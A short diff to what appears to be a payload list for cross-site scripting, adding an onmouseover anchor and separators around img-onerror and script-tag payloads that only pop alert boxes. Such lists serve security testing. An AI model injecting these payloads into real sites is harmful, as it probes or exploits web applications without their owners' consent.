@@ -1,10 +1,17 @@
 # Alerts and checks
 ```js
+# Hover
+<a onmouseover="alert('Hi!')">HOVER ME</a>
+------------------------------------------
+
 </span><img src=1 onerror=alert(1) /><span>
+------------------------------------------
 
 <script>alert("nu11secur1ty_is_here");</script>
+------------------------------------------
 
 <script>alert("Hello");</script>
+--------------------------------
 ```
 # Image Hidden
 ```js
